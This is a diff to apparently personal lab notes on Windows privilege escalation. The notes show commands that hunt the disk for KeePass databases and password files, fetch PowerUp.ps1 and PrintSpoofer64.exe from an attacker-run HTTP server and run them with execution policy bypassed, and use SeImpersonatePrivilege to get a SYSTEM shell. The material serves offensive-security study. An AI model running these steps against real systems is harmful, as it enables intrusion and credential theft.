@@ -269,11 +269,13 @@ When browsing a home dir of our user of public folders, we can find sensitive in
 We know that KeePass and XAMPP are on the system, so we should search for password manager databases and config files for these apps.
 
 ```console
-// no hits?
+
 
 PS C:\Users\dave> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 
+// also try with -Path C:\Users -Include *.txt
+// no hits?
 // try XAMPP config files - found passwords.txt!
 
 PS C:\Users\dave> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
@@ -647,7 +649,7 @@ $ python3 -m http.server 80
 
 // switch to victim terminal
 
-PS C:\Users\dave> iwr -uri http://222.222.222.222/PowerUp.ps1 -Outfile PowerUp.ps1
+PS C:\Users\dave> iwr -uri http://192.168.45.245/PowerUp.ps1 -Outfile PowerUp.ps1
 PS C:\Users\dave> powershell -ep bypass
 PS C:\Users\dave>  . .\PowerUp.ps1
 PS C:\Users\dave> Get-ModifiableServiceFile
@@ -1150,4 +1152,41 @@ SeUndockPrivilege             Remove computer from docking station      Disabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 SeTimeZonePrivilege           Change the time zone                      Disabled
+
+// second terminal 
+
+kali@kali:~$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
+...
+2022-07-07 03:48:45 (16.6 MB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]
+
+kali@kali:~$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+// first terminal
+
+C:\Users\dave> powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\dave> iwr -uri http://192.168.45.245/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+
+PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe
+.\PrintSpoofer64.exe -i -c powershell.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> whoami
+whoami
+nt authority\system
 ```
+
+PrintSpoofer was an easy exploit. There are also tools like variants from the [Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) family (RottenPotato, SweetPotato, JuicyPotato) that are an effective alternative to PrintSpoofer.
